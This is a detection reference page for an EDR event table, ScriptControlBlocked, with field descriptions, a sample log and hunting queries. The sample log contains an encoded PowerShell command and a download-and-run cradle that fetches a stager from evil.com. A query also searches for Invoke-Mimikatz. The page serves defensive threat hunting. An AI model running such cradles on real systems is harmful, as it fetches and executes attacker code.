## ScriptControlBlocked Table: Script Execution Blocked Event

### 1. Table Name
**ScriptControlBlocked**

---

### 2. Table Usage
This event is sent when Falcon Host has blocked malicious script content from being executed on a Windows machine. This event provides the details of exactly what content was blocked, which is invaluable for understanding and investigating prevented attacks, especially those involving fileless malware or obfuscated commands.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to the process hosting the script engine (e.g., `powershell.exe`, `wscript.exe`) whose execution was blocked. | Windows Only |
| ParentImageFileName | The full path to the parent process that spawned the script host. | Windows Only |
| CommandLine | The command line of the script host process that was blocked. | Windows Only |
| ScriptingLanguageId | An identifier for the scripting language that was blocked (e.g., PowerShell, VBScript, JScript). | Windows Only |
| ScriptContent | The full content of the script that was blocked from executing. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "ParentImageFileName": "C:\\Windows\\System32\\cmd.exe",
  "CommandLine": "powershell -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwB0AGEAZwBlAHIALgBwAHMAMQAnACkA",
  "ScriptingLanguageId": "1",
  "ScriptContent": "IEX(New-Object Net.WebClient).DownloadString('[http://evil.com/stager.ps1](http://evil.com/stager.ps1)')"
}
```
---

### 5. Example Queries
```xql
// Find all script control block events
event_simpleName=ScriptControlBlocked

// Find all blocked PowerShell scripts
event_simpleName=ScriptControlBlocked ImageFileName="*\\powershell.exe"

// Hunt for scripts blocked from executing out of a specific parent process, like an Office application
event_simpleName=ScriptControlBlocked ParentImageFileName IN ("*\\winword.exe", "*\\excel.exe")

// Search for specific suspicious commands within blocked script content
event_simpleName=ScriptControlBlocked ScriptContent="*DownloadString*" OR ScriptContent="*Invoke-Mimikatz*"

// Find blocked VBScripts or JScripts
event_simpleName=ScriptControlBlocked ScriptingLanguageId IN (4, 5)
```
---
